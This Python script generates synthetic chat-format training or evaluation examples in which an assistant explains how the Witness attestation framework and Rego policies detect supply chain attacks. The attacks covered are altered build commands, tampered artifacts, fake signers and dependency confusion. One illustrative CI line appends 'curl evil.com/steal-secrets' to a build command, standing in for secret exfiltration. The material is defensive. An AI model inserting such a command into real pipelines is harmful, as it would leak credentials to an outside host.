#!/usr/bin/env python3
"""
Generate supply chain attack detection examples.

Based on 2024-2025 attack research:
- Compromised build pipelines
- Tampered artifacts
- Unauthorized code injection
- Credential theft
- Dependency confusion

Each example shows:
1. The attack vector
2. How witness detects it
3. The Rego policy that catches it
4. Remediation steps
"""

import json
from pathlib import Path

SYSTEM_PROMPT = """You are an expert in the Witness supply chain attestation framework. You help users instrument CI/CD pipelines with witness, create policy documents, and write Rego policies to validate attestations. You understand all attestors in go-witness and how to use them effectively."""

ATTACK_SCENARIOS = [
    {
        "attack": "Compromised Build Command",
        "question": "How does witness detect if an attacker modifies my build command in CI?",
        "answer": """Witness detects modified build commands through the command-run attestor and Rego policies.

**Attack Vector**:
Attacker gains access to CI configuration and changes:
```yaml
# Original
- run: go build -o app

# Attacker modifies to
- run: go build -o app && curl evil.com/steal-secrets
```

**Detection with Witness**:
```rego
package commandrun

import rego.v1

# Allowlist approved commands
approved_commands := {
    ["go", "build", "-o", "app"],
    ["make", "all"]
}

deny contains msg if {
    not input.cmd in approved_commands
    msg := sprintf("Unauthorized command detected: %v", [input.cmd])
}
```

**How it works**:
1. Witness records the actual command executed
2. Policy verifies command matches allowlist
3. Modified command fails verification
4. Attack is detected before deployment

**Remediation**:
- Review CI configuration for unauthorized changes
- Rotate signing keys if compromised
- Investigate how attacker gained access"""
    },

    {
        "attack": "Artifact Tampering",
        "question": "How does witness prevent someone from modifying my build artifact after it's created?",
        "answer": """Witness prevents artifact tampering through cryptographic hashing in product attestations.

**Attack Vector**:
Attacker modifies binary after build but before deployment:
```bash
# Build creates app (hash: abc123)
go build -o app

# Attacker injects malware
echo "malicious code" >> app  # Now hash: def456
```

**Detection with Witness**:
The product attestor records SHA256 hash of files:
```json
{
  "app": {
    "sha256": "abc123...original-hash"
  }
}
```

When you try to verify tampered file:
```bash
witness verify -p policy.json -a build.att -f app
# FAILS: artifact hash mismatch
```

**How it works**:
1. Product attestor hashes file immediately after build
2. Hash is cryptographically signed
3. Any modification changes the hash
4. Verification detects mismatch

**Why this matters**: Even if attacker has deployment access, they cannot modify artifacts without detection."""
    },

    {
        "attack": "Unauthorized Signer",
        "question": "How does witness prevent an attacker from creating fake attestations?",
        "answer": """Witness prevents fake attestations through functionary validation in policies.

**Attack Vector**:
Attacker creates their own attestation with stolen/fake signing key.

**Detection with Witness Policy**:
```json
{
  "publickeys": {
    "trusted-ci-key": {
      "keyid": "sha256:abc123...",
      "key": "-----BEGIN PUBLIC KEY-----..."
    }
  },
  "steps": {
    "build": {
      "functionaries": [{
        "type": "publickey",
        "publickeyid": "trusted-ci-key"
      }]
    }
  }
}
```

**How it works**:
1. Policy lists ONLY authorized signing keys
2. `witness verify` checks attestation signature
3. If signed by different key → verification fails
4. Attacker's fake attestation rejected

**Key Management Best Practices**:
- Store signing keys in CI secrets/vault
- Never commit private keys to git
- Rotate keys periodically
- Use different keys for different steps"""
    },

    {
        "attack": "Dependency Confusion",
        "question": "How can witness help detect dependency confusion attacks?",
        "answer": """Witness detects dependency changes through lockfiles and material attestors.

**Attack Vector**:
Attacker publishes malicious package with same name as internal package:
```
Internal: @company/auth v1.0.0
Public: @company/auth v99.0.0 (malicious)
```

**Detection with Witness**:
```rego
package lockfiles

import rego.v1

# Expected dependency hashes
approved_deps := {
    "@company/auth": "sha256:abc123..."
}

deny contains msg if {
    some pkg, hash in input.packages
    pkg in approved_deps
    hash != approved_deps[pkg]
    msg := sprintf("Dependency %s hash mismatch", [pkg])
}
```

**How it works**:
1. Lockfiles attestor captures package-lock.json
2. Policy validates dependency hashes
3. Unexpected package version detected
4. Build fails before using malicious dependency

**Additional Protection**:
- Use material attestor to track package-lock.json changes
- Rego validates no unexpected modifications"""
    },

    {
        "attack": "CI Pipeline Compromise",
        "question": "How does witness detect if my GitHub Actions workflow is compromised?",
        "answer": """Witness detects workflow tampering through GitHub attestor and environment validation.

**Attack Vector**:
Attacker modifies .github/workflows/build.yml to:
- Disable tests
- Exfiltrate secrets
- Inject backdoors

**Detection with Witness**:
```rego
package github

import rego.v1

# Expected workflow file hash
expected_workflow_hash := "sha256:abc123..."

deny contains msg if {
    input.workflow != "build.yml"
    msg := "Unexpected workflow file"
}
```

**Environment attestor catches changes**:
```rego
package environment

import rego.v1

deny contains msg if {
    "DISABLE_TESTS" in input.variables
    msg := "Tests cannot be disabled"
}
```

**Multi-layer defense**:
1. GitHub attestor records workflow name
2. Environment attestor captures all env vars
3. Policies detect suspicious variables
4. Material attestor tracks .github/workflows/ changes"""
    },

    {
        "attack": "Unsigned Commit Injection",
        "question": "How does witness detect unsigned commits in my build?",
        "answer": """Witness detects unsigned commits through git attestor signature validation.

**Attack Vector**:
Attacker pushes unsigned commit with malicious code.

**Detection with Witness**:
```rego
package git

import rego.v1

# Require GPG signatures
deny contains msg if {
    count(input.signature) == 0
    msg := "Commit must be GPG signed"
}

deny contains msg if {
    not startswith(input.signature, "-----BEGIN PGP SIGNATURE-----")
    msg := "Invalid signature format"
}
```

**How it works**:
1. Git attestor captures commit signature
2. Policy requires non-empty signature field
3. Unsigned commits fail verification

**Setup GPG signing**:
```bash
# Configure git to sign commits
git config --global user.signingkey <key-id>
git config --global commit.gpgsign true

# Verify in attestation
witness run --step build -a git -k key.pem -o build.att -- go build
jq '.predicate.attestations[] | select(.type | contains("git")) | .attestation.signature' build.att
```

**Why this matters**: Ensures all code is traceable to verified developers."""
    },
]

def main():
    output_file = Path("/Users/nkennedy/proj/witness-evals/data/conceptual/attack_detection.jsonl")
    output_file.parent.mkdir(parents=True, exist_ok=True)

    examples = []
    for scenario in ATTACK_SCENARIOS:
        examples.append({
            "messages": [
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": scenario['question']},
                {"role": "assistant", "content": scenario['answer']}
            ],
            "_metadata": {
                "attack_type": scenario['attack'],
                "category": "supply_chain_security"
            }
        })

    with open(output_file, 'w') as f:
        for ex in examples:
            f.write(json.dumps(ex) + '\n')

    print(f"✓ Generated {len(examples)} attack detection examples")
    print(f"  Output: {output_file}")

if __name__ == "__main__":
    main()
